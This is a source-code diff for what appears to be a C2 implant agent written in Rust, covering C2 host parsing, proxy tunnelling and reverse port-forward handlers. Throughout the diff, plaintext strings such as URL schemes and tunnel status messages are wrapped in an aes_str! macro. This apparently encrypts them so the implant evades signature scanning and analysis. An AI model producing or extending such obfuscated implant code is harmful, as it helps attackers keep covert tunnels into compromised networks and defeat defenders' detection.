@@ -24,10 +24,10 @@ use super::{HandlerContext, DispatchResult, AgentAction, RportfwdHandle};
 /// silently dropping the tunnel connection.
 fn bare_host(c2_host: &str) -> &str {
     // Strip "https://", "http://", or any other scheme
-    if let Some(rest) = c2_host.strip_prefix("https://") {
+    if let Some(rest) = c2_host.strip_prefix(aes_str!("https://").as_str()) {
         // Also strip any trailing path: "192.168.56.1:4443/beacon" -> "192.168.56.1:4443"
         rest.split('/').next().unwrap_or(rest)
-    } else if let Some(rest) = c2_host.strip_prefix("http://") {
+    } else if let Some(rest) = c2_host.strip_prefix(aes_str!("http://").as_str()) {
         rest.split('/').next().unwrap_or(rest)
     } else {
         c2_host
@@ -98,7 +98,7 @@ pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -
                     .await;
             }
             Err(e) => {
-                eprintln!("[Proxy] Failed to connect tunnel to {}: {}", addr, e);
+                eprintln!("{} {}: {}", aes_str!("[Proxy] Failed to connect tunnel to"), addr, e);
             }
         }
     });
@@ -150,7 +150,7 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
         if handles.iter().any(|h| h.server_port == tunnel_port) {
             return DispatchResult::Reply(
                 String::new(),
-                format!("rportfwd on tunnel port {} already active", tunnel_port),
+                format!("{} {} {}", aes_str!("rportfwd on tunnel port"), tunnel_port, aes_str!("already active")),
                 1, AgentAction::None,
             );
         }
@@ -166,7 +166,7 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
         let stream = match TcpStream::connect(&addr).await {
             Ok(s) => s,
             Err(e) => {
-                eprintln!("[rportfwd] Failed to connect tunnel to {}: {}", addr, e);
+                eprintln!("{} {}: {}", aes_str!("[rportfwd] Failed to connect tunnel to"), addr, e);
                 return;
             }
         };
@@ -210,7 +210,7 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
     }
 
     DispatchResult::Reply(
-        format!("Reverse port forward active: tunnel:{} → {}:{}", tunnel_port, target_host, target_port),
+        format!("{}: tunnel:{} → {}:{}", aes_str!("Reverse port forward active"), tunnel_port, target_host, target_port),
         String::new(), 0, AgentAction::None,
     )
 }
@@ -231,11 +231,11 @@ pub fn handle_rportfwd_stop(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
                 let h = handles.remove(idx);
                 h.abort.abort();
                 DispatchResult::Reply(
-                    format!("Stopped rportfwd on tunnel port {}", port),
+                    format!("{} {}", aes_str!("Stopped rportfwd on tunnel port"), port),
                     String::new(), 0, AgentAction::None,
                 )
             } else {
-                DispatchResult::Reply(String::new(), format!("No rportfwd on port {}", port), 1, AgentAction::None)
+                DispatchResult::Reply(String::new(), format!("{} {}", aes_str!("No rportfwd on port"), port), 1, AgentAction::None)
             }
         }
         Err(_) => DispatchResult::Reply(String::new(), aes_str!("rportfwd lock poisoned"), 1, AgentAction::None),
@@ -249,7 +249,7 @@ pub fn handle_rportfwd_list(ctx: &HandlerContext) -> DispatchResult {
                 return DispatchResult::Reply(aes_str!("No active reverse port forwards"), String::new(), 0, AgentAction::None);
             }
             let lines: Vec<String> = handles.iter().map(|h| {
-                format!("tunnel:{} → {}:{}", h.server_port, h.target_host, h.target_port)
+                format!("{}:{} → {}:{}", aes_str!("tunnel"), h.server_port, h.target_host, h.target_port)
             }).collect();
             DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
         }
